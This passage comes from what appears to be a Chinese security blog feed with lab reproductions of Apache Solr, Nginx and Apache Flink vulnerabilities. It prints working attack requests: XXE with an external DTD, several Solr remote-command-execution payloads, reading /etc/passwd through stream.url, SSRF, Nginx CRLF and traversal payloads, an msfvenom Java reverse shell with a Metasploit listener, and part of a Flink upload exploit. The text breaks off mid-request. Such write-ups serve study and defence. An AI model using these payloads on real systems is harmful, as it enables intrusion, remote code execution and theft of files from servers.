class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.101:8983&#x2F;solr&#x2F;demo&#x2F;select?q&#x3D;%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2f192.168.1.100%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&amp;wt&#x3D;xml&amp;defType&#x3D;xmlparser</span><br></pre></td></tr></table></figure><p><img src="../../images/middleware/solr/1.png" alt=""><br>漏洞分析：<a href="https://paper.seebug.org/425/" target="_blank" rel="noopener">https://paper.seebug.org/425/</a></p><h1 id="Apache-Solr-远程命令执行漏洞（CVE-2017-12629）"><a href="#Apache-Solr-远程命令执行漏洞（CVE-2017-12629）" class="headerlink" title="Apache Solr 远程命令执行漏洞（CVE-2017-12629）"></a>Apache Solr 远程命令执行漏洞（CVE-2017-12629）</h1><p>首先创建一个listener，其中设置exe的值为我们想执行的命令，args的值是命令参数： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;demo&#x2F;config HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.101:8983</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 158</span><br><span class="line"></span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;&#x2F;bin&#x2F;&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch &#x2F;tmp&#x2F;success&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="../../images/middleware/solr/2.png" alt=""><br>然后进行update操作，触发刚才添加的listener： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;demo&#x2F;update HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">[&#123;&quot;id&quot;:&quot;test&quot;&#125;]</span><br></pre></td></tr></table></figure><p><img src="../../images/middleware/solr/3.png" alt=""></p><h1 id="Apache-Solr-远程命令执行漏洞（CVE-2019-0193）"><a href="#Apache-Solr-远程命令执行漏洞（CVE-2019-0193）" class="headerlink" title="Apache Solr 远程命令执行漏洞（CVE-2019-0193）"></a>Apache Solr 远程命令执行漏洞（CVE-2019-0193）</h1><p>此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。</p><p><img src="../../images/middleware/solr/4.png" alt=""></p><p>如上图所示，首先打开刚刚创建好的test核心，选择Dataimport功能并选择debug模式，填入以下POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type&#x3D;&quot;URLDataSource&quot;&#x2F;&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          function poc()&#123; java.lang.Runtime.getRuntime().exec(&quot;touch &#x2F;tmp&#x2F;success&quot;);</span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;&lt;&#x2F;script&gt;</span><br><span class="line">  &lt;document&gt;</span><br><span class="line">    &lt;entity name&#x3D;&quot;stackoverflow&quot;</span><br><span class="line">            url&#x3D;&quot;https:&#x2F;&#x2F;stackoverflow.com&#x2F;feeds&#x2F;tag&#x2F;solr&quot;</span><br><span class="line">            processor&#x3D;&quot;XPathEntityProcessor&quot;</span><br><span class="line">            forEach&#x3D;&quot;&#x2F;feed&quot;</span><br><span class="line">            transformer&#x3D;&quot;script:poc&quot; &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;document&gt;</span><br><span class="line">&lt;&#x2F;dataConfig&gt;</span><br></pre></td></tr></table></figure><p>点击Execute with this Confuguration会发送以下请求包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;test&#x2F;dataimport?_&#x3D;1565835261600&amp;indent&#x3D;on&amp;wt&#x3D;json HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8983</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 679</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;localhost:8983&#x2F;solr&#x2F;</span><br><span class="line">Cookie: csrftoken&#x3D;gzcSR6Sj3SWd3v4ZxmV5OcZuPKbOhI6CMpgp5vIMvr5wQAL4stMtxJqL2sUE8INi; sessionid&#x3D;snzojzqa5zn187oghf06z6xodulpohpr</span><br><span class="line"></span><br><span class="line">command&#x3D;full-import&amp;verbose&#x3D;false&amp;clean&#x3D;false&amp;commit&#x3D;true&amp;debug&#x3D;true&amp;core&#x3D;test&amp;dataConfig&#x3D;%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&amp;name&#x3D;dataimport</span><br></pre></td></tr></table></figure><h1 id="Apache-Solr-Velocity-注入远程命令执行漏洞-CVE-2019-17558"><a href="#Apache-Solr-Velocity-注入远程命令执行漏洞-CVE-2019-17558" class="headerlink" title="Apache Solr Velocity 注入远程命令执行漏洞 (CVE-2019-17558)"></a>Apache Solr Velocity 注入远程命令执行漏洞 (CVE-2019-17558)</h1><p>Apache Solr 5.0.0版本至8.3.1版本中存在输入验证错误漏洞。攻击者可借助Velocity模板利用该漏洞在系统上执行任意代码。  </p><p>默认情况下params.resource.loader.enabled配置未打开，无法使用自定义模板。我们先通过如下API获取所有的核心：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8983&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json</span><br></pre></td></tr></table></figure><p><img src="../../images/middleware/solr/5.png" alt=""></p><p>启用params.resource.loader。启用配置通过以下API,该API端点<code>/solr/[core name]/config</code>:       </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;demo&#x2F;config HTTP&#x2F;1.1</span><br><span class="line">Host: solr:8983</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../../images/middleware/solr/6.png" alt=""><br>之后，注入Velocity模板即可执行任意命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.101:8983&#x2F;solr&#x2F;demo&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure><p><img src="../../images/middleware/solr/7.png" alt="">  </p><h1 id="Apache-solr任意文件读取"><a href="#Apache-solr任意文件读取" class="headerlink" title="Apache solr任意文件读取"></a>Apache solr任意文件读取</h1><p>访问得到内核</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;your-ip:8983&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json</span><br></pre></td></tr></table></figure><p><img src="../../images/middleware/solr/8.png" alt="">  </p><p>发送如下请求，开启内核的 RemoteStreaming</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;demo&#x2F;config HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.101:8983</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">&#123;  &quot;set-property&quot; :&#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="../../images/middleware/solr/9.png" alt=""><br>通过 stream.url 任意文件读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;demo&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.101:8983</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line"></span><br><span class="line">stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="../../images/middleware/solr/10.png" alt=""> </p><p>SSRF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;demo&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.101:8983</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 34</span><br><span class="line"></span><br><span class="line">stream.url&#x3D;http:&#x2F;&#x2F;tegean.dnslog.cn</span><br></pre></td></tr></table></figure><p><img src="../../images/middleware/solr/11.png" alt=""> </p><p>参考文章：<br><a href="https://vulhub.org/" target="_blank" rel="noopener">https://vulhub.org/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。  &lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Nginx相关漏洞</title>
    <link href="https://blog.cfyqy.com/article/3954b176.html"/>
    <id>https://blog.cfyqy.com/article/3954b176.html</id>
    <published>2021-04-15T08:49:51.000Z</published>
    <updated>2021-04-15T12:53:53.587Z</updated>
    
    <content type="html"><![CDATA[<p>Nginx (engine x) 是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务。  </p><a id="more"></a><h1 id="Nginx-文件名逻辑漏洞（CVE-2013-4547）"><a href="#Nginx-文件名逻辑漏洞（CVE-2013-4547）" class="headerlink" title="Nginx 文件名逻辑漏洞（CVE-2013-4547）"></a>Nginx 文件名逻辑漏洞（CVE-2013-4547）</h1><p>影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p><p>这个漏洞其实和代码执行没有太大关系，其主要原因是错误地解析了请求的URI，错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。</p><p>举个例子，比如，Nginx匹配到.php结尾的请求，就发送给fastcgi进行解析，常见的写法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line"></span><br><span class="line">    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  &#x2F;var&#x2F;www&#x2F;html$fastcgi_script_name;</span><br><span class="line">    fastcgi_param  DOCUMENT_ROOT &#x2F;var&#x2F;www&#x2F;html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常情况下（关闭pathinfo的情况下），只有.php后缀的文件才会被发送给fastcgi解析。</p><p>而存在CVE-2013-4547的情况下，我们请求<code>1.gif[0x20][0x00].php</code>，这个URI可以匹配上正则.php$，可以进入这个Location块；但进入后，Nginx却错误地认为请求的文件是<code>1.gif[0x20]</code>，就设置其为SCRIPT_FILENAME的值发送给fastcgi。</p><p>fastcgi根据SCRIPT_FILENAME的值进行解析，最后造成了解析漏洞。</p><p>所以，我们只需要上传一个空格结尾的文件，即可使PHP解析之。</p><p>再举个例子，比如很多网站限制了允许访问后台的IP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F;admin&#x2F; &#123;</span><br><span class="line">    allow 127.0.0.1;</span><br><span class="line">    deny all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以请求如下URI：<code>/test[0x20]/../admin/index.php</code>，这个URI不会匹配上location后面的/admin/，也就绕过了其中的IP验证；但最后请求的是<code>/test[0x20]/../admin/index.php</code>文件，也就是/admin/index.php，成功访问到后台。（这个前提是需要有一个目录叫test：这是Linux系统的特点，如果有一个不存在的目录，则即使跳转到上一层，也会爆文件不存在的错误，Windows下没有这个限制）</p><p>漏洞复现：<br>这个环境是黑名单验证，我们无法上传php后缀的文件，需要利用CVE-2013-4547。我们上传一个1.gif，注意后面的空格<br><img src="../../images/middleware/nginx/1.png" alt=""><br>访问<code>http://your-ip:8080/uploadfiles/1.gif[0x20][0x00].php</code>，即可发现PHP已被解析： </p><p><img src="../../images/middleware/nginx/2.png" alt=""><br>注意，<code>[0x20]</code>是空格，<code>[0x00]</code>是\0，这两个字符都不需要编码。      </p><p>漏洞分析：<br><a href="http://www.91ri.org/9064.html" target="_blank" rel="noopener">CVE-2013-4547 Nginx解析漏洞深入利用及分析</a>  </p><h1 id="Nginx越界读取缓存漏洞（CVE-2017-7529）"><a href="#Nginx越界读取缓存漏洞（CVE-2017-7529）" class="headerlink" title="Nginx越界读取缓存漏洞（CVE-2017-7529）"></a>Nginx越界读取缓存漏洞（CVE-2017-7529）</h1><p>Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括“文件头”+“HTTP返回包头”+“HTTP返回包体”。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。</p><p>如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。 </p><p>访问<a href="http://your-ip:8080/，即可查看到Nginx默认页面，这个页面实际上是反向代理的8081端口的内容。" target="_blank" rel="noopener">http://your-ip:8080/，即可查看到Nginx默认页面，这个页面实际上是反向代理的8081端口的内容。</a></p><p>调用python3 poc.py <a href="http://your-ip:8080/，读取返回结果：" target="_blank" rel="noopener">http://your-ip:8080/，读取返回结果：</a><br><img src="../../images/middleware/nginx/3.png" alt=""><br>可见，越界读取到了位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。<br>漏洞分析：<br><a href="https://cert.360.cn/warning/detail?id=b879782fbad4a7f773b6c18490d67ac7" target="_blank" rel="noopener">https://cert.360.cn/warning/detail?id=b879782fbad4a7f773b6c18490d67ac7</a> </p><h1 id="Nginx-配置错误导致漏洞"><a href="#Nginx-配置错误导致漏洞" class="headerlink" title="Nginx 配置错误导致漏洞"></a>Nginx 配置错误导致漏洞</h1><p>错误配置一：<br>CRLF注入漏洞<br>Nginx会将$uri进行解码，导致传入%0a%0d即可引入换行符，造成CRLF注入漏洞。</p><p>错误的配置文件示例（原本的目的是为了让http的请求跳转到https上）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F; &#123;</span><br><span class="line">    return 302 https:&#x2F;&#x2F;$host$uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payload: <a href="http://your-ip:8080/%0a%0dSet-Cookie:%20a=1，可注入Set-Cookie头。" target="_blank" rel="noopener">http://your-ip:8080/%0a%0dSet-Cookie:%20a=1，可注入Set-Cookie头。</a></p><p>错误配置二：<br>目录穿越漏洞<br>Nginx在配置别名（Alias）的时候，如果忘记加/，将造成一个目录穿越漏洞。</p><p>错误的配置文件示例（原本的目的是为了让用户访问到/home/目录下的文件）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F;files &#123;</span><br><span class="line">    alias &#x2F;home&#x2F;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payload: <a href="http://your-ip:8081/files../" target="_blank" rel="noopener">http://your-ip:8081/files../</a> ，成功穿越到根目录：<br><img src="../../images/middleware/nginx/4.png" alt="">   </p><p>错误配置三：<br>Nginx配置文件子块（server、location、if）中的add_header，将会覆盖父块中的add_header添加的HTTP头，造成一些安全隐患。</p><p>如下列代码，整站（父块中）添加了CSP头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add_header Content-Security-Policy &quot;default-src &#39;self&#39;&quot;;</span><br><span class="line">add_header X-Frame-Options DENY;</span><br><span class="line"></span><br><span class="line">location &#x3D; &#x2F;test1 &#123;</span><br><span class="line">    rewrite ^(.*)$ &#x2F;xss.html break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location &#x3D; &#x2F;test2 &#123;</span><br><span class="line">    add_header X-Content-Type-Options nosniff;</span><br><span class="line">    rewrite ^(.*)$ &#x2F;xss.html break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但/test2的location中又添加了X-Content-Type-Options头，导致父块中的add_header全部失效：</p><h1 id="Nginx-解析漏洞复现"><a href="#Nginx-解析漏洞复现" class="headerlink" title="Nginx 解析漏洞复现"></a>Nginx 解析漏洞复现</h1><p>Nginx解析漏洞复现。</p><p>版本信息：</p><p>Nginx 1.x 最新版<br>PHP 7.x最新版<br>由此可知，该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。  </p><p>增加/.php后缀，被解析成PHP文件：</p><p><img src="../../images/middleware/nginx/6.png" alt=""></p><p>前面说了该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。那么我们看一下配置不当的地方。<br><img src="../../images/middleware/nginx/5.png" alt=""><br>这是一段nginx配置，将.php结尾的文件都会交给fastcgi来执行，/uploadfiles/nginx.png/a.php也会交给fastcgi解析，fastcgi在解析”.php”文件时发现文件并不存在，这时php.ini配置文件中的cig.fix_pathinfo就发挥作用了，ccgi.fix_pathinfo是默认开启的，当php遇到文件路径/aaa.xxx/bbb.yyy/ccc.zzz时，若/aaa.xxx/bbb.yyy/ccc.zzz不存在，则会去掉最后的/ccc.zzz，然后判断/aaa.xxx/bbb.yyy是否存在，若存在，则把/aaa.xxx/bbb.yyy当做文件/aaa.xxx/bbb.yyy/ccc.zzz解析，若/aaa.xxx/bbb.yyy仍不存在，则继续去掉/bbb.yyy，以此类推。那么fastcgi到底能解析哪些文件呢，这个由php-fpm.conf中的security.limit_extensions参数决定的，下面是php手册中对security.limit_extensions的解释     </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">security.limit_extensions string       </span><br><span class="line">限制 FPM 允许解析的脚本扩展名。 此设置可以预防 web 服务器配置的错误。</span><br><span class="line">应当限制 FPM 仅仅解析 .php 扩展名，阻止恶意用户使用其他扩展名运行 php 代码。 默认值： .php .phar</span><br></pre></td></tr></table></figure><p>应当注意的是当此项设置为空的时候表示允许fastcgi将’.png’等文件当做代码解析，恰好这个漏洞环境就是security.limit_extensions为空。成功将nginx.png当成了php执行</p><p>修复方案<br>1、如果cig.fix_pathinfo可以关闭的话就关闭，关闭该选项很可能会导致一些其他错误，所以一般是开启的<br>2、将security.limit_extensions选项只填写.php，阻止恶意用户使用其他扩展名运行 php 代码，下面是我们修改了配置重启之后的再恶意执行的情况，Access denied.。</p><p>参考文章：<br><a href="https://www.cnblogs.com/HelloCTF/p/14098983.html#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0" target="_blank" rel="noopener">Nginx 解析漏洞</a><br><a href="https://vulhub.org/" target="_blank" rel="noopener">https://vulhub.org/</a>  </p><p><a href="https://www.cnblogs.com/HelloCTF/p/14098983.html" target="_blank" rel="noopener">https://www.cnblogs.com/HelloCTF/p/14098983.html</a> </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Nginx (engine x) 是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务。  &lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Apache Flink 相关漏洞</title>
    <link href="https://blog.cfyqy.com/article/81e2968a.html"/>
    <id>https://blog.cfyqy.com/article/81e2968a.html</id>
    <published>2021-04-15T05:30:00.000Z</published>
    <updated>2021-04-15T08:47:21.103Z</updated>
    
    <content type="html"><![CDATA[<p>Apache Flink是一个分布式大数据处理引擎，可以对有限数据流和无限数据流进行有状态计算。可部署在各种集群环境，对各种大小的数据规模进行快速计算。   </p><a id="more"></a><p><a href="https://www.cnblogs.com/feiyudemeng/p/8998772.html" target="_blank" rel="noopener">深入理解Apache Flink核心技术</a></p><h1 id="Apache-Flink-Dashboard-未授权访问-远程代码命令执行"><a href="#Apache-Flink-Dashboard-未授权访问-远程代码命令执行" class="headerlink" title="Apache Flink Dashboard 未授权访问-远程代码命令执行"></a>Apache Flink Dashboard 未授权访问-远程代码命令执行</h1><p>getshell    </p><p>kail下生成   </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/shell_reverse_tcp lhost=192.168.1.100 lport=1234 -f jar &gt;a.jar</span><br></pre></td></tr></table></figure><p>msf接收shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload java&#x2F;shell_reverse_tcp</span><br><span class="line">set LHOST 192.168.1.100</span><br><span class="line">set LPORT 1234</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>将jar包上传后点击上传的包然后Submit<br><img src="../../images/middleware/flink/2.png" alt=""></p><p><img src="../../images/middleware/flink/3.png" alt="">   </p><h1 id="Apache-Flink-文件上传漏洞-CVE-2020-17518"><a href="#Apache-Flink-文件上传漏洞-CVE-2020-17518" class="headerlink" title="Apache Flink 文件上传漏洞(CVE-2020-17518)"></a>Apache Flink 文件上传漏洞(CVE-2020-17518)</h1><p>pache Flink框架是一个开源的流处理与强大的流和批处理功能。 　　 　　Apache Flink 1.5.1介绍REST处理程序允许您编写一个上传文件在本地文件系统上的任意位置,通过一个HTTP头恶意修改。     </p><p>Flink 具有监控 API，可用于查询”正在运行的jobs” 和 “最近完成的jobs” 的状态和统计信息。该监控 API 被用于 Flink 自己的dashboard，同时也可用于自定义监控工具，默认监听在8081端口。该监控 API 是 REST-ful API, 即接受 HTTP请求，并响应JSON格式的数据</p><p>监控 API 中有一个API是 /jars/upload，其作用是将一个jar上传到集群。该jar必须作为多部分数据发送。确保“ Content-Type”标头设置为“ application / x-java-archive”，因为某些http库默认情况下不添加标头。可以通过curl上传jar文件</p><p>影响版本：Apache Flink: 1.5.1 - 1.11.2 </p><p>上传文件 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;jars&#x2F;upload HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.102:8081</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Length: 185</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;jarfile&quot;; 